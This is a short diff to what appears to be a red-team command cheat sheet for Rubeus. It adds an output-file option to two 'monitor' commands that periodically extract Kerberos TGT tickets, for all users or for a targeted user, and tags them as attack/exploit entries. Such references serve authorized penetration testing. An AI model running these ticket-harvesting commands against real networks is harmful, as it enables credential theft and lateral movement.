@@ -59,13 +59,13 @@
 ## monitor - extract periodically tgt
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe monitor /nowrap /interval:<sec_delai|5>
+.\Rubeus.exe monitor /nowrap /interval:<sec_delai|5> [ /consoleoutfile:<file_path>]
 ```
 
 ## monitor - extract periodically tgt of a user
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe monitor /nowrap /interval:<sec_delai|5> /targetuser:<target_user>
+.\Rubeus.exe monitor /nowrap /interval:<sec_delai|5> /targetuser:<target_user> [ /consoleoutfile:<file_path>]
 ```
 
 ## harvest -  monitor + auto renewal before expiration
